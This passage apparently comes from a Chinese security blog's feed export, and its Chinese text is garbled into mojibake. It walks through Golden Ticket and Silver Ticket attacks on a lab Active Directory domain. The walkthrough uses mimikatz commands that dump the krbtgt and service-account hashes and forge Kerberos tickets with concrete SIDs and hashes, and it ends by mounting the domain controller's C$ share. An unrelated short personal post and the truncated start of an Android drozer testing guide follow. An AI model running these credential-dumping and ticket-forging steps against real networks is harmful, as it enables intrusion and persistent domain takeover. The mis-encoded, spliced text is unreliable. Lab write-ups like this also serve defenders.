æ­¤æˆ‘ä»¬éœ€è¦è·å–åŸŸç®¡ç†å‘˜æƒé™ï¼Œåªè¦æ‹¿åˆ°äº† krbtgt å¯†ç  Hash å°±å¯ä»¥éšæ„ä¼ªé€ STæœåŠ¡ç¥¨æ®ï¼Œè¿›è€Œä½¿ç”¨STæœåŠ¡ç¥¨æ®è®¿é—®åŸŸæ§åˆ¶å™¨ï¼Œä½¿ç”¨ krbtgt ç”¨æˆ· Hash ç”Ÿæˆçš„ç¥¨æ®è¢«ç§°ä¸º é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰ã€‚</p><h3 id="åˆ¶ä½œé»„é‡‘ç¥¨æ®æ¡ä»¶"><a href="#åˆ¶ä½œé»„é‡‘ç¥¨æ®æ¡ä»¶" class="headerlink" title="åˆ¶ä½œé»„é‡‘ç¥¨æ®æ¡ä»¶"></a>åˆ¶ä½œé»„é‡‘ç¥¨æ®æ¡ä»¶</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŸŸå</span><br><span class="line">åŸŸsidå€¼</span><br><span class="line">éœ€è¦ä¼ªé€ çš„åŸŸç”¨æˆ·å</span><br><span class="line">krbtgt è´¦æˆ·å“ˆå¸Œå€¼æˆ–AES-256å€¼</span><br></pre></td></tr></table></figure></div><h3 id="é»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ"><a href="#é»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ" class="headerlink" title="é»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ"></a>é»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ</h3><p>1ã€è·å–åŸŸç®¡ç†å‘˜æƒé™åï¼Œç™»å½•åŸŸæ§ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨ krbtgt è´¦å·ï¼Œå°è¯•è¿›è¡Œé»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»ï¼Œå®ç°æƒé™æŒä¹…åŒ–ç»´æŒ</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">net user krbtgt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120123857565.png" data-caption="image-20230120123857565"><img src="/../images/domain/ptt/image-20230120123857565.png" alt="image-20230120123857565"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120124116925.png" data-caption="image-20230120124116925"><img src="/../images/domain/ptt/image-20230120124116925.png" alt="image-20230120124116925"></a></p><p>2ã€æŸ¥çœ‹åŸŸä¿¡æ¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120125657793.png" data-caption="image-20230120125657793"><img src="/../images/domain/ptt/image-20230120125657793.png" alt="image-20230120125657793"></a></p><p>3ã€è·å– krbtgt è´¦å·çš„ SID å€¼å’Œå“ˆå¸Œå€¼ï¼Œåˆ©ç”¨ mimikatz è¿›è¡Œè·å–</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:åŸŸå /user:krbtgt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120130405535.png" data-caption="image-20230120130405535"><img src="/../images/domain/ptt/image-20230120130405535.png" alt="image-20230120130405535"></a></p><p>4ã€æ•´åˆåŸŸæ§ä¿¡æ¯å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-1359007890-1682372173-1631803504# SIDå€¼</span><br><span class="line">4a67f14d5cc4fa22618c8b609e832db6# Hash NTLM å€¼</span><br><span class="line">owa.redteam.red# åŸŸä¸»æœºå</span><br><span class="line">redteam.red# åŸŸå</span><br></pre></td></tr></table></figure></div><br/><p>5ã€åˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼Œåˆ©ç”¨ mimikatz è¿›è¡Œåˆ¶ä½œï¼Œæ­¤æ“ä½œåœ¨åŸŸå†…ä»»ä¸€ä¸»æœºä¸Šæ™®é€šæƒé™å³å¯ï¼Œç°è½¬è‡³å…¶ä¸­ä¸€ä¸ªåŸŸæˆå‘˜ SQLSERVER-2008 è®¡ç®—æœºä¸Šæ“ä½œ</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230120131311827.png" data-caption="image-20230120131311827"><img src="/../images/domain/ptt/image-20230120131311827.png" alt="image-20230120131311827"></a></p><p>åœ¨åˆ¶ä½œç¥¨æ®å‰ï¼Œå…ˆå°†ç¥¨æ®æ¸…ç©ºï¼Œé˜²æ­¢ä¹‹å‰çš„ç¥¨æ®å¯¹æ–°ä½œçš„ç¥¨æ®äº§ç”Ÿå½±å“</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135302687.png" data-caption="image-20230123135302687"><img src="/../images/domain/ptt/image-20230123135302687.png" alt="image-20230123135302687"></a></p><p>åˆ©ç”¨ mimikatz ç”Ÿæˆé»„é‡‘ç¥¨æ®å¹¶å¯¼å…¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:è¦ä¼ªé€ çš„åŸŸç”¨æˆ·(ä¸€èˆ¬å¡«å†™åŸŸç®¡ç†å‘˜) /domain:åŸŸå /sid:åŸŸSIDå€¼ /krbtgt:krbtgtè´¦æˆ·çš„hashå€¼ /ptt</span><br><span class="line">kerberos::golden /user:administrator /domain:redteam.red /sid:S-1-5-21-1359007890-1682372173-1631803504 /krbtgt:4a67f14d5cc4fa22618c8b609e832db6 /ptt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135447067.png" data-caption="image-20230123135447067"><img src="/../images/domain/ptt/image-20230123135447067.png" alt="image-20230123135447067"></a></p><p>æŸ¥çœ‹ç¥¨æ®æ˜¯å¦å·²ç»ç”Ÿæˆå¯¼å…¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135528127.png" data-caption="image-20230123135528127"><img src="/../images/domain/ptt/image-20230123135528127.png" alt="image-20230123135528127"></a></p><p>6ã€åœ¨å¯¼å…¥ç¥¨æ®çš„åŸŸå†…æœºå™¨ä¸Šï¼Œé‡æ–°æ‰“å¼€cmdçª—å£ï¼Œç›´æ¥åˆ—å‡ºåŸŸæ§ç›®å½•</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\åŸŸæ§ä¸»æœºå.åŸŸå\c$</span><br></pre></td></tr></table></figure></div><p>é»„é‡‘ç¥¨æ®æ”»å‡»å‰</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123142243785.png" data-caption="image-20230123142243785"><img src="/../images/domain/ptt/image-20230123142243785.png" alt="image-20230123142243785"></a></p><p>é»„é‡‘ç¥¨æ®æ”»å‡»å</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123135725487.png" data-caption="image-20230123135725487"><img src="/../images/domain/ptt/image-20230123135725487.png" alt="image-20230123135725487"></a></p><p>å°†åŸŸæ§ä¸»æœº owa çš„ c ç›˜æ˜ å°„åˆ°æœ¬åœ°çš„ k ç›˜</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k: \\åŸŸæ§ä¸»æœºå.åŸŸå\c$</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123140050974.png" data-caption="image-20230123140050974"><img src="/../images/domain/ptt/image-20230123140050974.png" alt="image-20230123140050974"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123140230369.png" data-caption="image-20230123140230369"><img src="/../images/domain/ptt/image-20230123140230369.png" alt="image-20230123140230369"></a></p><hr><h2 id="ä¸‰ã€ç™½é“¶ç¥¨æ®-Silver-Ticket-ä¼ é€’æ”»å‡»"><a href="#ä¸‰ã€ç™½é“¶ç¥¨æ®-Silver-Ticket-ä¼ é€’æ”»å‡»" class="headerlink" title="ä¸‰ã€ç™½é“¶ç¥¨æ®(Silver Ticket)ä¼ é€’æ”»å‡»"></a>ä¸‰ã€ç™½é“¶ç¥¨æ®(Silver Ticket)ä¼ é€’æ”»å‡»</h2><p>ç™½é“¶ç¥¨æ®çš„åˆ©ç”¨è¿‡ç¨‹æ˜¯ä¼ªé€  TGSï¼Œé€šè¿‡å·²çŸ¥çš„æˆæƒæœåŠ¡å¯†ç ï¼ˆhashï¼‰ç”Ÿæˆä¸€å¼ å¯ä»¥è®¿é—®è¯¥æœåŠ¡çš„TGTã€‚å³é€šè¿‡è·å–ç›¸åº”çš„æœåŠ¡è´¦å·çš„ hash æ¥ä¼ªé€  TGS ç»™æˆ‘ä»¬è‡ªå·±ç­¾å‘ä»»æ„ç”¨æˆ·çš„ TGS ç¥¨æ®ï¼ˆservice ticketï¼‰ï¼Œä¾‹å¦‚ï¼šLDAPã€MSSQLã€WinRMã€DNSã€CIFSç­‰ï¼ŒèŒƒå›´æœ‰é™ï¼Œåªèƒ½è·å–å¯¹åº”æœåŠ¡çš„æƒé™ï¼Œè¿™ä¸ªç¥¨æ®ä¹Ÿè¢«ç§°ä¸ºç™½é“¶ç¥¨æ®ï¼ˆSilver Ticketï¼‰ã€‚</p><h3 id="åˆ¶ä½œç™½é“¶ç¥¨æ®æ¡ä»¶"><a href="#åˆ¶ä½œç™½é“¶ç¥¨æ®æ¡ä»¶" class="headerlink" title="åˆ¶ä½œç™½é“¶ç¥¨æ®æ¡ä»¶"></a>åˆ¶ä½œç™½é“¶ç¥¨æ®æ¡ä»¶</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åŸŸå</span><br><span class="line">åŸŸSIDå€¼</span><br><span class="line">éœ€è¦ä¼ªé€ çš„åŸŸç”¨æˆ·ï¼ˆä¸€èˆ¬å¡«å†™åŸŸç®¡ç†å‘˜è´¦å·ï¼‰</span><br><span class="line">å¯åˆ©ç”¨çš„æœåŠ¡</span><br><span class="line">æœåŠ¡è´¦å·çš„NTLM Hashå€¼</span><br></pre></td></tr></table></figure></div><h3 id="ç™½é“¶ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ"><a href="#ç™½é“¶ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ" class="headerlink" title="ç™½é“¶ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ"></a>ç™½é“¶ç¥¨æ®ä¼ é€’æ”»å‡»å®è·µ</h3><p>ç™½é“¶ç¥¨æ®ä¼ªé€  CIFS æœåŠ¡æƒé™ï¼ŒCIFS æœåŠ¡é€šå¸¸ç”¨äº Windows ä¸»æœºä¹‹é—´çš„æ–‡ä»¶å…±äº«ã€‚</p><p>1ã€æŸ¥çœ‹åŸŸä¿¡æ¯</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185504423.png" data-caption="image-20230123185504423"><img src="/../images/domain/ptt/image-20230123185504423.png" alt="image-20230123185504423"></a></p><p>2ã€è·å–åŸŸSIDå€¼å’ŒæœåŠ¡è´¦å·çš„ NTLM Hash</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185650392.png" data-caption="image-20230123185650392"><img src="/../images/domain/ptt/image-20230123185650392.png" alt="image-20230123185650392"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123185946330.png" data-caption="image-20230123185946330"><img src="/../images/domain/ptt/image-20230123185946330.png" alt="image-20230123185946330"></a></p><p>4ã€æ•´åˆåŸŸæ§ä¿¡æ¯å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">189988620695f11d6c9a91da29eda1f8# NTLM HASH</span><br><span class="line">S-1-5-21-1359007890-1682372173-1631803504# SID å€¼</span><br><span class="line">owa.redteam.red# ä¸»æœºå</span><br><span class="line">redteam.red# åŸŸå</span><br></pre></td></tr></table></figure></div><br/><p>5ã€åˆ¶ä½œç™½é“¶ç¥¨æ®ï¼Œåˆ©ç”¨ mimikatz åœ¨åŸŸå†…æˆå‘˜ä¸»æœºä¸Šè¿›è¡Œæ“ä½œ</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;åŸŸå&gt; /sid:&lt;åŸŸ SID&gt; /target:&lt;ç›®æ ‡æœåŠ¡å™¨ä¸»æœºå&gt; /service:&lt;æœåŠ¡ç±»å‹&gt; /rc4:&lt;NTLMHash&gt; /user:&lt;ä¼ªé€ çš„ç”¨æˆ·å&gt; /ptt</span><br><span class="line">kerberos::golden /domain:redteam.red /sid:S-1-5-21-1359007890-1682372173-1631803504  /target:owa.redteam.red /rc4:189988620695f11d6c9a91da29eda1f8  /service:cifs /user:admin /ptt</span><br></pre></td></tr></table></figure></div><p>ç™½é“¶ç¥¨æ®ä¼ªé€  CIFS æœåŠ¡æ”»å‡»å‰</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123191308558.png" data-caption="image-20230123191308558"><img src="/../images/domain/ptt/image-20230123191308558.png" alt="image-20230123191308558"></a></p><p>ç™½é“¶ç¥¨æ®ä¼ªé€  CIFS æœåŠ¡æ”»å‡»å</p><p><a data-fancybox="gallery" data-src="/../images/domain/ptt/image-20230123191525936.png" data-caption="image-20230123191525936"><img src="/../images/domain/ptt/image-20230123191525936.png" alt="image-20230123191525936"></a></p><hr><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>é»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»ä¸ç™½é“¶ç¥¨æ®ä¼ é€’æ”»å‡»ä¸¤è€…åŒºåˆ«åœ¨äº</p><p>è®¿é—®æƒé™</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é»„é‡‘ç¥¨æ®ï¼šä¼ªé€ TGTï¼Œå¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™</span><br><span class="line">ç™½é“¶ç¥¨æ®ï¼šä¼ªé€ TGSï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡</span><br></pre></td></tr></table></figure></div><p>åŠ å¯†æ–¹å¼</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é»„é‡‘ç¥¨æ®ç”± krbtgt çš„ Hash åŠ å¯†</span><br><span class="line">ç™½é“¶ç¥¨æ®ç”±æœåŠ¡è´¦å·ï¼ˆé€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·ï¼‰HashåŠ å¯†</span><br></pre></td></tr></table></figure></div><p>éšè”½æ€§</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç™½é“¶ç¥¨æ®ä¸ç»è¿‡ KDCï¼Œå› æ­¤ç™½é“¶ç¥¨æ®æ—¥å¿—ç›¸å¯¹äºé»„é‡‘ç¥¨æ®ä¼šæ›´å°‘ï¼ŒåŒæ—¶ç™½é“¶ç¥¨æ®çš„æ—¥å¿—éƒ½åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼ŒåŸŸæ§ä¸Šä¸ä¼šæœ‰æ—¥å¿—</span><br><span class="line">ç™½é“¶ç¥¨æ®åˆ©ç”¨æœåŠ¡è´¦æˆ·çš„å“ˆå¸Œå€¼ï¼Œä¸åŒäºé»„é‡‘ç¥¨æ®åˆ©ç”¨ krbtgt è´¦æˆ·çš„å“ˆå¸Œå€¼ï¼Œå› æ­¤ç™½é“¶ç¥¨æ®æ›´åŠ éšè”½</span><br></pre></td></tr></table></figure></div><hr><h2 id="äº”ã€å‚è€ƒ"><a href="#äº”ã€å‚è€ƒ" class="headerlink" title="äº”ã€å‚è€ƒ"></a>äº”ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/341103.html</span><br><span class="line">https://mp.weixin.qq.com/s/g-FEUXISYarj7ksYVxWCtg</span><br><span class="line">https://blog.csdn.net/zzgslh/article/details/106896431</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> åŸŸæ¸—é€ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¥¨æ®ä¼ é€’æ”»å‡» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç«™æ‚è´§åº—-ä½ æœŸå¾…çš„ï¼Œæ­£åœ¨è·¯ä¸Š</title>
      <link href="/2023/01/22/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E4%BD%A0%E6%9C%9F%E5%BE%85%E7%9A%84%EF%BC%8C%E6%AD%A3%E5%9C%A8%E8%B7%AF%E4%B8%8A/"/>
      <url>/2023/01/22/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E4%BD%A0%E6%9C%9F%E5%BE%85%E7%9A%84%EF%BC%8C%E6%AD%A3%E5%9C%A8%E8%B7%AF%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/private/enjoy_your_life.jpg" data-caption="Enjoy_Your_Life"><img src="/../images/private/enjoy_your_life.jpg" alt="Enjoy_Your_Life"></a></p><h2 id="ä½ æœŸå¾…çš„ï¼Œæ­£åœ¨è·¯ä¸Š"><a href="#ä½ æœŸå¾…çš„ï¼Œæ­£åœ¨è·¯ä¸Š" class="headerlink" title="ä½ æœŸå¾…çš„ï¼Œæ­£åœ¨è·¯ä¸Š"></a>ä½ æœŸå¾…çš„ï¼Œæ­£åœ¨è·¯ä¸Š</h2><p>ç”Ÿæ´»å°±åƒä¸€ç›’å·§å…‹åŠ›ï¼Œä½ æ°¸è¿œä¸çŸ¥é“ä¸‹ä¸€é¢—æ˜¯ä»€ä¹ˆå‘³é“ã€‚çæƒœå½“ä¸‹ï¼Œæ„Ÿå—ç”Ÿæ´»ï¼Œè¿½æ±‚çƒ­çˆ±ã€‚å°è¯•é‡Šæ€€ï¼Œé‡æ–°å‡ºå‘ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> å°ç«™æ‚è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæµ‹è¯•ç³»åˆ—-å››å¤§ç»„ä»¶å®‰å…¨æµ‹è¯•</title>
      <link href="/2022/12/28/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/12/28/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221230164849744.png" data-caption="image-20221230164849744"><img src="/../images/app/Components/image-20221230164849744.png" alt="image-20221230164849744"></a></p><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>ä¹‹å‰çš„æ–‡ç« ä»‹ç»äº† APP æŠ“åŒ…çš„å‡ ç§æ–¹æ³•ï¼Œè§£å†³äº†æŠ“åŒ…é—®é¢˜ï¼Œå…¶ä½™ APP åŠŸèƒ½ç‚¹æµ‹è¯•ä¸ WEB ç«¯æµ‹è¯•å¦‚å‡ºä¸€è¾™ã€‚æœ¬æ–‡ä¸»è¦ä»‹ç» Android APP æµ‹è¯•ä¸­å››å¤§ç»„ä»¶ç›¸å…³æµ‹è¯•æ‰‹æ®µã€‚<br><br/></p><h3 id="Android-å››å¤§ç»„ä»¶"><a href="#Android-å››å¤§ç»„ä»¶" class="headerlink" title="Android å››å¤§ç»„ä»¶"></a>Android å››å¤§ç»„ä»¶</h3><p>Android å››å¤§ç»„ä»¶åˆ†åˆ«æ˜¯ Activityã€Content Providerã€Broadcast Receiver ä»¥åŠ Service</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| ç»„ä»¶åç§°            | å…·ä½“ç”¨é€”                                                     |</span><br><span class="line">| -----------------  | ------------------------------------------------------------ |</span><br><span class="line">| Activity           | å±•ç¤ºç»„ä»¶ï¼Œç”¨äºå‘ç”¨æˆ·ç›´æ¥å±•ç¤ºä¸€ä¸ªç•Œé¢ï¼Œè€Œä¸”å¯ä»¥æ¥å—ç”¨æˆ·çš„è¾“å…¥ä¿¡æ¯ä»è€Œè¿›è¡Œäº¤äº’ |</span><br><span class="line">| Broadcast Receiver | é€šè®¯ç»„ä»¶ï¼Œç”¨äºåœ¨ä¸åŒç»„ä»¶ç”šè‡³ä¸åŒåº”ç”¨ä¸­ä¼ é€’æ¶ˆæ¯               |</span><br><span class="line">| Content Provider   | æ•°æ®å…±äº«ç»„ä»¶ï¼Œç”¨äºå‘å…¶ä»–ç»„ä»¶ä¹ƒè‡³å…¶ä»–åº”ç”¨å…±äº«æ•°æ®             |</span><br><span class="line">| Service            | èƒ½åœ¨åå°æ‰§è¡Œé•¿æœŸè¿è¡Œæ“ä½œçš„ç»„ä»¶ï¼Œå®ƒæ²¡æœ‰UIç•Œé¢ï¼Œè¿è¡Œåœ¨å®¿ä¸»è¿›ç¨‹çš„ä¸»çº¿ç¨‹ä¸­ï¼Œå› æ­¤æ‰§è¡Œè€—æ—¶çš„åå°è®¡ç®—ä»»åŠ¡éœ€è¦åœ¨å•ç‹¬çš„çº¿ç¨‹ä¸­å»å®Œæˆ |</span><br></pre></td></tr></table></figure></div><br/><hr><h2 id="äºŒã€ç¯å¢ƒæ­å»º"><a href="#äºŒã€ç¯å¢ƒæ­å»º" class="headerlink" title="äºŒã€ç¯å¢ƒæ­å»º"></a>äºŒã€ç¯å¢ƒæ­å»º</h2><h3 id="drozer-å®‰è£…"><a href="#drozer-å®‰è£…" class="headerlink" title="drozer å®‰è£…"></a>drozer å®‰è£…</h3><p>drozer å®‰è£…åœ¨ Windows ä¸‹ï¼Œå®‰è£…ç¯å¢ƒå¿…é¡»ä¸º python 2.7ï¼Œä¸‹è½½åœ°å€ <a href="https://github.com/WithSecureLabs/drozer/releases/tag/2.4.4">Github</a>ã€<a href="https://labs.withsecure.com/tools/drozer">å®˜ç½‘</a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116102905092.png" data-caption="image-20221116102905092"><img src="/../images/app/Components/image-20221116102905092.png" alt="image-20221116102905092"></a></p><p>1ã€å®‰è£… drozer å‰å…ˆå®‰è£… python 2.7ï¼Œå®‰è£…æ—¶é€‰æ‹©è‡ªåŠ¨æ·»åŠ ç¯å¢ƒå˜é‡</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116195702257.png" data-caption="image-20221116195702257"><img src="/../images/app/Components/image-20221116195702257.png" alt="image-20221116195702257"></a></p><p>å®‰è£…å®Œæˆï¼Œæµ‹è¯•æ˜¯å¦æˆåŠŸå®‰è£…</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116195828270.png" data-caption="image-20221116195828270"><img src="/../images/app/Components/image-20221116195828270.png" alt="image-20221116195828270"></a></p><p>2ã€å®‰è£… dorzer ï¼Œä¸‹è½½ <a href="https://github.com/mwrlabs/drozer/releases/download/2.4.4/drozer-2.4.4.win32.msi">drozer</a> åç‚¹å‡»å®‰è£…ï¼Œç”±äºç³»ç»Ÿæ²¡æœ‰è¯†åˆ«åˆ° Python2.7ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŒ‡å®š python2.7 è·¯å¾„ï¼Œè‹¥ç³»ç»Ÿèƒ½è¯†åˆ«åˆ°ï¼Œåˆ™é€‰æ‹© python2.7 å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116200101626.png" data-caption="image-20221116200101626"><img src="/../images/app/Components/image-20221116200101626.png" alt="image-20221116200101626"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221116200255960.png" data-caption="image-20221116200255960"><img src="/../images/app/Components/image-20221116200255960.png" alt="image-20221116200255960"></a></p><p>drozer æˆåŠŸå®‰è£…åï¼Œè½¯ä»¶ä½äº Python 2.7 ä¸‹çš„ Scripts ç›®å½•ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221117205713220.png" data-caption="image-20221117205713220"><img src="/../images/app/Components/image-20221117205713220.png" alt="image-20221117205713220"></a></p><p>3ã€æ‰‹æœºå®‰è£… <code>drozer-agent-2.3.4.apk</code>ï¼Œ<a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">ç‚¹å‡»ä¸‹è½½</a> å®‰è£…å®Œæˆåï¼Œæµ‹è¯•æ˜¯å¦å¯æ­£å¸¸ä½¿ç”¨ã€‚é¦–å…ˆè¿›å…¥ dorzer-agent app ç‚¹å‡»å³ä¸‹æŒ‰é’®ï¼Œå¼€å¯ç«¯å£è½¬å‘åŠŸèƒ½ã€‚ç„¶åä½¿ç”¨<code>å…·å¤‡æ•°æ®ä¼ è¾“çš„ USB çº¿</code>ï¼Œæ‰‹æœºè¿æ¥ç”µè„‘ï¼Œç‚¹å‡»æ–‡ä»¶ä¼ è¾“ä½¿ç”µè„‘å¯è¿æ¥è‡³æ‰‹æœº</p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221228201311642.png" data-caption="image-20221228201311642"><img src="/../images/app/Components/image-20221228201311642.png" alt="image-20221228201311642"></a></p><p>ä½¿ç”¨ adb è½¯ä»¶è¿›è¡Œç«¯å£è½¬å‘ï¼Œä½¿æ‰‹æœºä¸ç”µè„‘å¯è¿›è¡Œé€šä¿¡ï¼Œå‘½ä»¤ï¼š<code>adb forward tcp:31415 tcp:31415</code> <a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn">ç‚¹å‡»ä¸‹è½½adb</a></p><p><a data-fancybox="gallery" data-src="/../images/app/Components/image-20221123144712299.png" data-caption="image-20221123144712299"><img src="/../images/app/Components/image-20221123144712299.png" 